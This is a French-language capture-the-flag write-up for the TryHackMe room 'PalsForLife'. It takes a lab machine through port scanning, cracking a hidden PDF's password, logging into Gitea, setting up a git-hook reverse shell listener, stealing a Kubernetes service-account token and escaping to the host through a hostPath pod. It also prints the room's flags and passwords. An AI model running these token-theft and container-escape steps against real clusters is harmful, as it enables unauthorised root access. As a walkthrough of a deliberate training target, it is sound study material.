# PalsForLife # 

## Task 1 Deploy the VM ##

## Task 2 Compromise the machine ## 

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c 'echo "10.10.189.96 palsforlife.thm" >> /etc/hosts'
[sudo] Mot de passe de tim : 
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A palsforlife.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 16:44 CET
Nmap scan report for palsforlife.thm (10.10.189.96)
Host is up (0.037s latency).
Not shown: 65529 closed ports
PORT      STATE    SERVICE           VERSION
22/tcp    open     ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c9:f7:dd:3d:79:bb:f8:44:0f:bd:87:bd:8b:af:e1:5a (RSA)
|   256 4c:48:9d:c6:b4:e2:17:99:76:48:20:fe:96:d2:c8:eb (ECDSA)
|_  256 d8:e2:f7:ac:4d:cd:68:66:d7:a9:64:1c:42:4a:8e:30 (ED25519)
6443/tcp  open     ssl/sun-sr-https?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 01 Nov 2021 15:47:49 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Mon, 01 Nov 2021 15:47:22 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:palsforlife.thm, IP Address:10.10.189.96, IP Address:10.43.0.1, IP Address:127.0.0.1, IP Address:172.30.18.136, IP Address:192.168.1.244
| Not valid before: 2021-05-31T21:56:08
|_Not valid after:  2022-11-01T15:47:16
10250/tcp open     ssl/http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=palsforlife
| Subject Alternative Name: DNS:palsforlife, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.189.96
| Not valid before: 2021-05-31T21:56:08
|_Not valid after:  2022-11-01T15:41:58
30180/tcp filtered unknown
31111/tcp filtered unknown
31112/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6443-TCP:V=7.91%T=SSL%I=7%D=11/1%Time=61800C0A%P=x86_64-pc-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,11A,"HTTP/1\.0\x20401\x20Unauthorized\r\
SF:nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20application
SF:/json\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x2015:47:22\x20GMT\r\nConte
SF:nt-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"m
SF:etadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"reas
SF:on\":\"Unauthorized\",\"code\":401}\n")%r(HTTPOptions,11A,"HTTP/1\.0\x2
SF:0401\x20Unauthorized\r\nCache-Control:\x20no-cache,\x20private\r\nConte
SF:nt-Type:\x20application/json\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x201
SF:5:47:22\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"
SF:apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":
SF:\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":401}\n")%r(RTSPRe
SF:quest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x2301800text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(FourOhFourRequest,11A,"HTTP/1\.0\x20401\x20Unauthorized
SF:\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20applicat
SF:ion/json\r\nDate:\x20Mon,\x2001\x20Nov\x202021\x2015:47:49\x20GMT\r\nCo
SF:ntent-Length:\x20129\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",
SF:\"metadata\":{},\"status\":\"Failure\",\"message\":\"Unauthorized\",\"r
SF:eason\":\"Unauthorized\",\"code\":401}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/1%OT=22%CT=1%CU=34798%PV=Y%DS=2%DC=T%G=Y%TM=61800C6
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.52 ms 10.9.0.1
2   34.16 ms palsforlife.thm (10.10.189.96)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.42 seconds

```

Nmap nous montre plusieurs services qui sont : 
Le service SSH sur le port 22.   
Le service HTTPS sur le port 10250.  
D'autre services sur d'autre ports.  

![page](./Task1-01.png)

Sur le port 30180 on est sur un serveur nginx.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ gobuster dir -u http://palsforlife.thm:30180 -w /usr/share/dirb/wordlists/common.txt  -t 100 -q
/team                 (Status: 301) [Size: 169] [--> http://palsforlife.thm/team/]
```

Avec gobuster on découvre un répertoire team.   

```text
tim@kali:~/Bureau/tryhackme/write-up$ curl http://palsforlife.thm:30180/team/
...
      <div id="uninteresting_file.pdf" style="visibility: hidden; display: none;">JVBERi0xLjcKJb/3ov4KMSAwIG9iago8PCAvRGVzdHMgMyAwIFIgL0V4dGVuc2lvbnMgPDwgL0FE
QkUgPDwgL0Jhc2VWZXJzaW9uIC8xLjcgL0V4dGVuc2lvbkxldmVsIDggPj4gPj4gL1BhZ2VzIDQg
MCBSIC9UeXBlIC9DYXRhbG9nID4+CmVuZG9iagoyIDAgb2JqCjw8IC9DcmVhdGlvbkRhdGUgPDEw
Y2ZlYThkZWMyYTBjOGMzOGQ1ZTYwMzBlYzQxOTQ5NGZiMGU2OWQ5MzViZDNkNjc5ODNiZTAxNWY4
MzdiYjJjNThjYmQzYzQ5OGRkOWZmYzE0OTMwNzZiNTY4YjE1Nz4gL0NyZWF0b3IgPGI3ZDRmNjA3
NTljZDRlOWM3MjU0Nzc5ZjgxZWQ3ZGU5ODdkNjVmOWVhODAzNDVjYjllNTkyNWUxOTllZTk5Njkw
MGUzYjkzYjAzNjQ2MzM3MTNjMzRlYmZlYjgzMGQ3ZWEzYWE0ZDhmOTUyYTJiOWU2OTI0ZmMzZmNi
MzNjM2EyMjU3NmQ5MGI3NjBkNzE5NzExY2U5OGQ2ZDhlYzI3NmM5ZGUwYjI0YTYwZDdjMTIxMjZm
YWZhZDM3MmEwOTlkMDE2NjYzNzY5NjY3ZTQ0MTQ4ODQ3NzQ1MzVkMTMxZmE1MmViYTYzOGY0ZTFl
MTNjNTBlNWFmMjJkNzYzZTJkMDM+IC9Nb2REYXRlIDxhMjlmZDI3NjY2MGJiYzVkNWIzNGQ4ZjBi
MTY5MTBkNzk3NzVhM2YxYWU5ODQyZjAzNTRkMTg0OGUzOTgyMThmYzQwNWJkMDJmNDJiYjI0ZjQw
OWUzYWIzYTY5YjMxMzY+IC9Qcm9kdWNlciA8YzE3NjNhMDhkODBlZGExNjlkYzU0ZjRmYzQ5M2Qw
Y2MwMDhhOGI1ODUxODYxYTI0OTk2MTNiOGViOTc4NDY1NT4gPj4KZW5kb2JqCjMgMCBvYmoKPDwg
LyBbIDUgMCBSIC9YWVogMCA3OTIgMCBdID4+CmVuZG9iago0IDAgb2JqCjw8IC9Db3VudCAxIC9L
aWRzIFsgNSAwIFIgXSAvVHlwZSAvUGFnZXMgPj4KZW5kb2JqCjUgMCBvYmoKPDwgL0NvbnRlbnRz
IDYgMCBSIC9NZWRpYUJveCBbIDAgMCA2MTIgNzkyIF0gL1BhcmVudCA0IDAgUiAvUmVzb3VyY2Vz
IDw8IC9FeHRHU3RhdGUgPDwgL0czIDcgMCBSID4+IC9Gb250IDw8IC9GNCA4IDAgUiA+PiAvUHJv
Y1NldCBbIC9QREYgL1RleHQgL0ltYWdlQiAvSW1hZ2VDIC9JbWFnZUkgXSA+PiAvU3RydWN0UGFy
ZW50cyAwIC9UeXBlIC9QYWdlID4+CmVuZG9iago2IDAgb2JqCjw8IC9GaWx0ZXIgL0ZsYXRlRGVj
b2RlIC9MZW5ndGggMzUyID4+CnN0cmVhbQrynz/c+wDMRP2iI2LVzUv0pSjf72jTU8je/EHoykqo
bpRAbKheTM5Uj7sfr6RZkIhXWrduEgTgOHXBZYOH2LdKMj6O+udayAeznReuT+FxZi8jExPGpWQP
Oq2jrp201IJGYQuPl6XoixwrR36GB8buUp0Wk7w/vR3PVq9gPwcCBfFLmz7kO9Pa2ANf+YLG20cQ
aBCEsMV2DH78sL4GiD0aVTytrDFCpYE3wRAFrNXVz1XI/2cVA74hdjAW92f9RPD5cL9AoLrY9RM5
4imB/ogFNhw4qN7RQsKPiY2aUvIQoMm1OXqueFh7e86//OM2HIVsF3escxDQYq+myn+bIAN+Hpek
ROE8k98j0SD8s5a0I9fTZY0g5GtaA02il2tRlvF3SQaZrBTOhki1emKEfhpi8pDgYThCir8M0D04
mEhnhKdohK+/1a9uMSm4csAXCNBt3GEUaGr6kRZv8hRuRJ4wZW5kc3RyZWFtCmVuZG9iago3IDAg
b2JqCjw8IC9CTSAvTm9ybWFsIC9jYSAxID4+CmVuZG9iago4IDAgb2JqCjw8IC9CYXNlRm9udCAv
TGliZXJhdGlvblNhbnMgL0Rlc2NlbmRhbnRGb250cyBbIDkgMCBSIF0gL0VuY29kaW5nIC9JZGVu
dGl0eS1IIC9TdWJ0eXBlIC9UeXBlMCAvVG9Vbmljb2RlIDEwIDAgUiAvVHlwZSAvRm9udCA+Pgpl
bmRvYmoKOSAwIG9iago8PCAvQmFzZUZvbnQgL0xpYmVyYXRpb25TYW5zIC9DSURTeXN0ZW1JbmZv
IDw8IC9PcmRlcmluZyA8YmJmZGU0ZDg2YzAwZDEzZjVhMGZmZDBjZTIwODg3OWVlYzJkMTI3NzZh
MzZjOTNhMDBlZDYwZjA1M2E1ZGYyOD4gL1JlZ2lzdHJ5IDw4YWY1MmNiZmUyYzcyN2YxZWRiYjBk
MDAzM2E1YTZjMTllY2FhYmY5NzA1YTVhMGExMTQ1MTNlNjU3YjdiMDgzPiAvU3VwcGxlbWVudCAw
ID4+IC9DSURUb0dJRE1hcCAvSWRlbnRpdHkgL0RXIDAgL0ZvbnREZXNjcmlwdG9yIDExIDAgUiAv
U3VidHlwZSAvQ0lERm9udFR5cGUyIC9UeXBlIC9Gb250IC9XIFsgMCBbIDc1MCAwIDAgMjc3Ljgz
MjAzIF0gNiAyNCA1NTYuMTUyMzQgNDQgWyAyNzcuODMyMDMgXSA1MSBbIDY2Ni45OTIxOSBdIDY2
IDc0IDU1Ni4xNTIzNCA3NiA3OSAyMjIuMTY3OTcgODAgWyA4MzMuMDA3ODEgXSA4MSA4OCA1NTYu
MTUyMzQgOTggWyAyNzcuODMyMDMgXSBdID4+CmVuZG9iagoxMCAwIG9iago8PCAvRmlsdGVyIC9G
bGF0ZURlY29kZSAvTGVuZ3RoIDMzNiA+PgpzdHJlYW0K7RNOxqjNBqNGN3/3AP8psbDMkSeis6UA
/HBxGLO2z4CNGgbMk4fKcs4vihOE+n2DlYfkB9ok/ZI2hi8NcinFXo5MiylmDj1HOpGeDeFhfi2k
9RjFxrITtB4nUyu2D6V4544VyqUt/+2i3m4Z9a1TSIdoJpWOswFgAFjNDlQUeKh+NP1VN4J/3OVr
RTqAbCp3HfcFnV9X+RK7wg5XEzLoxmo8p/Upw8ePjFlRndzMackPTX7dbS1KKQSV8J9N4qTJVqH6
VDRtWOWGNUJVrUtDl1YhiVMY553nbFLEd/dhrxG/MLhAf+OMz0o+J4x0oSIezkfz6ARG/Vgxgk7f
Hl7aAkm116AMIBbL/ijrtkV8L73ajs4pL0bRbFUp3+r89lMoq/N+3ZSJRhSiAJWkd16KRUxBLJpq
ABCKSgUICKMYjb5ZazUuhhyZ10fpY2rckJYeZW5kc3RyZWFtCmVuZG9iagoxMSAwIG9iago8PCAv
QXNjZW50IDkwNS4yNzM0NCAvQ2FwSGVpZ2h0IDY4Ny45ODgyOCAvRGVzY2VudCAtMjExLjkxNDA2
IC9GbGFncyA0IC9Gb250QkJveCBbIC01NDMuOTQ1MzEgLTMwMy4yMjI2NiAxMzAxLjc1NzgxIDk3
OS45ODA0NyBdIC9Gb250RmlsZTIgMTIgMCBSIC9Gb250TmFtZSAvTGliZXJhdGlvblNhbnMgL0l0
YWxpY0FuZ2xlIDAgL1N0ZW1WIDQ1Ljg5ODQzOCAvVHlwZSAvRm9udERlc2NyaXB0b3IgPj4KZW5k
b2JqCjEyIDAgb2JqCjw8IC9GaWx0ZXIgL0ZsYXRlRGVjb2RlIC9MZW5ndGgxIDgzNTYgL0xlbmd0
aCA1MjMyID4+CnN0cmVhbQpkdpRgSZLwtNeHdqUxdoHA311+jULTQXx58eeicK90vLNe2gDrd1WJ
fPxYzs6GmystpeeJNNI4SiHxBH5myWCq5/CF3Cp+3PtjKrvU4vyX3ZWoBlFQ/eAr7LKc3N8a9TYk
...
```

Dans la page team on trouve une grande chaîne en base64.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat base64.file | base64 -d > a
tim@kali:~/Bureau/tryhackme/write-up$ file a
a: PDF document, version 1.7
tim@kali:~/Bureau/tryhackme/write-up$ cp a a.pdf
```

On sauve la sortie du base64 décodé dans fichier.   
On analyse le fichier, c'est un fichier pdf.  
On le renomme.  

![page](./Task1-02.png)  

Le fichier pdf a besoin d'un mot de passe.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ wget https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/pdf2john.py -nv
2021-11-01 17:21:05 URL:https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/pdf2john.py [13574/13574] -> "pdf2john.py" [1]

tim@kali:~/Bureau/tryhackme/write-up$ python2 pdf2john.py a.pdf > hash

tim@kali:~/Bureau/tryhackme/write-up$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chickenlegs      (a.pdf)
1g 0:00:00:21 DONE (2021-11-01 17:24) 0.04553g/s 2762p/s 2762c/s 2762C/s crazyk..bobby23
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

Le casse le mot de passe du pdf qui est : chickenlegs.   

![page](./Task1-03.png)  

Dans le fichier pdf on trouve un mot de passe qui est : I_am_geniu5_P4ladin#   

![page](./Task1-04.png)  

On est sur une implémentation de gitea. 

![page](./Task1-05.png)  

Dans explore on trouve un utilisateur au nom de : leeroy  

![page](./Task1-06.png)  

On se connecte sur le compte de leeroy avec le mot de passe dans le pdf.   

![page](./Task1-07.png) 

Dans webhook dans le code source on trouve le flag.

Le flag est : flag{Stick_to_the_plan!}  

![page](./Task1-08.png)   

Dans le git hook on met un reverse shell.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

On écoute le port 1234 pour avoir un shell.   

![page](./Task1-09.png)   

On modifit un article et on valide les modifications.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ nc -lvnp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.189.96.
Ncat: Connection from 10.10.189.96:36592.
bash: cannot set terminal process group (14): Not a tty
bash: no job control in this shell
```

**Flag 2**

On obtient un shell.   

```bash
bash-4.4$ ls /root
ls /root
flag2.txt
bash-4.4$ cat /root/flag2.txt
cat /root/flag2.txt
flag{_G0ddamit_Leeroy_}
```

Dans le répetoire root on voit un fichier flag2.txt.   
On le lit et on a le flag qui est : flag{_G0ddamit_Leeroy_}  

**Flag 3**

```bash
bash-4.4$ ls /var/run/secrets/ 
ls /var/run/secrets/
kubernetes.io
```

On est dans une machine kubernetes.    

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w
```

On récupère le token kubernetes.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ kubectl --token "$(cat token)" --insecure-skip-tls-verify --server=https://palsforlife.thm:6443 auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```  
On regarde à quoi on a accès, on peut tout avoir.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ kubectl --token "$(cat token)" --insecure-skip-tls-verify --server=https://palsforlife.thm:6443 -n kube-system get secret flag3 -o json | jq -r '.data | map_values(@base64d)'
{
  "flag3.txt": "flag{Its_n0t_my_fault!}"
}
```

On récupère le troisième flag qui est : flag{Its_n0t_my_fault!}  

**Flag4**  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ kubectl --token "$(cat token)" --insecure-skip-tls-verify --server=https://palsforlife.thm:6443 get node -o yaml | grep sha256
      - docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
      - docker.io/gitea/gitea@sha256:34d8b322635e5f8fb6585a29d54c31eed94d72af19383744349dbc2107083587
      - docker.io/rancher/local-path-provisioner@sha256:9666b1635fec95d4e2251661e135c90678b8f45fd0f8324c55db99c80e2a958c
      - docker.io/rancher/coredns-coredns@sha256:8b675d12eb9faf3121475b12db478ac2cf5129046d92137aa9067dd04f3b4e10
      - docker.io/rancher/pause@sha256:d22591b61e9c2b52aecbf07106d5db313c4f178e404d660b32517b18fcbf0144
```

On regarde les images disponibles, on va prendre la nginx.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ cat host.yaml 
apiVersion: v1
kind: Pod
metadata:
  name: host
spec:
  containers:
  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
    name: host
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory

tim@kali:~/Bureau/tryhackme/write-up$ kubectl --token "$(cat token)" --insecure-skip-tls-verify --server=https://palsforlife.thm:6443 -n default apply -f host.yaml
pod/host created
```

On crée notre pod.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ kubectl --token "$(cat token)" --insecure-skip-tls-verify --server=https://palsforlife.thm:6443 -n default exec -it host bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@host:/# id
uid=0(root) gid=0(root) groups=0(root)
root@host:/# cat /host/root/root.txt
flag{At_least_I_have_chicKen}
```

On se connecte avec notre pod avec les droits root.   
On lit notre dernier flag dans /host/root/root.txt.    
Le flag est : flag{At_least_I_have_chicKen}   